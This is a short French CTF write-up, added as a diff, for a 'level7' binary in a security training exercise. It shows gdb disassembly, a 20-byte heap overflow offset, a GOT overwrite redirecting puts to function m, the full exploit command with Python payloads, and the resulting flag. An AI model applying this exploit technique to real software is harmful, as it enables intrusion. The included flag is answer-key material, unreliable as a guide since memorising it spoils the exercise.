@@ -1,0 +1,28 @@
+gdb ./level7
+
+0x080484f4  m
+0x08048521  main
+
+du coup le but du jeu va etre de faire pareil que dans le level 6 override le strcpy et "jump" a l'endroit qu'on veut
+
+donc on fait des test pour voir quand ca segfault
+on voit que c au bout de 20 carc
+le deuxieme arg ne segfault pas 
+
+il faut overflow pour réécrire le premier paramètre du deuxième strcpy et utiliser la fonction en elle même pour remplacer l'appel à puts par un appel à m
+
+derrière fgets récurère le contenu du fichier et le stock dans la variable d'environnement qui serra print par la fonction m
+
+donc on overflow de 20 comme ce au'on avait vue ensuite on donne l'adress de puts et dans l'arg 2 l'adress de m
+
+pour avoir l'adress de puts il faut le disas
+(gdb) disas puts
+Dump of assembler code for function puts@plt:
+   0x08048400 <+0>:     jmp    *0x8049928
+et pour m il faut prendre la premiere ligne 
+0x080484f4 <+0>:     push   %ebp
+
+./level7 $(python -c "print '.'*20 + '\x28\x99\x04\x08'") $(python -c "print '\xf4\x84\x04\x08'")
+et hop le flag
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ - 1638204185
